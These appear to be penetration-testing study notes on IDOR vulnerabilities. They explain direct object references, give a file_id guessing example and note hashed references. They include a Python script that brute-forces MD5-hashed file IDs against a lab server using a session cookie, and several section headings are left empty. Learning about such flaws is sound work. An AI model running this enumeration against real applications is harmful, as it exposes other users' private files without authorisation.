# What is it

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

For example, if users request access to a file they recently uploaded, they may get a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its `file_id`.

The main takeaway is that `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`
# Identifying IDORs

## URL Parameters & APIs

## AJAX Calls

## Hashing/Encoding

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.

# Second-Order IDOR



```python
import hashlib, requests

URL = "http://172.17.0.2/file.php"
COOKIE = {"PHPSESSID": "evu3lpmb2uslfdcb337deojlqj"}

for file_id in range(1000):
    id_hash = hashlib.md5(str(file_id).encode()).hexdigest()

    r = requests.get(URL, params={"file": id_hash}, cookies=COOKIE)

    if not "File does not exist!" in r.text:
        print(f"Found file with id: {file_id} -> {id_hash}")
```

# Second-Order LFI
